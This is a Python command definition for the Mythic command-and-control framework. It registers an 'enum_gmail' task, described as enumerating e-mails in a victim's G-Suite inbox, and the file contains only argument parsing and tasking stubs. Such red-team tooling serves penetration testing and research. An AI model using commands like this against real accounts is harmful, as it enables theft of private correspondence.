from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class EnumGmailArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="page_offset",
                cli_name="page_offset",
                display_name="Page Offset",
                type=ParameterType.String,
                description="Page Offset in Gmail Inbox to capture e-mails"),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require page_offset to run.\n\tUsage: {}".format(EnumGmailCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            if self.command_line[0] == '"' and self.command_line[-1] == '"':
                self.command_line = self.command_line[1:-1]
            elif self.command_line[0] == "'" and self.command_line[-1] == "'":
                self.command_line = self.command_line[1:-1]
            self.add_arg("command", self.command_line)


class EnumGmailCommand(CommandBase):
    cmd = "enum_gmail"
    needs_admin = False
    help_cmd = ""
    description = "Enumerates E-mails on G-Suite inbox"
    version = 1
    author = "@thiagomayllart"
    argument_class = EnumGmailArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = task.args.get_arg("page_offset")
        return task

    async def process_response(self, response: AgentResponse):
        pass
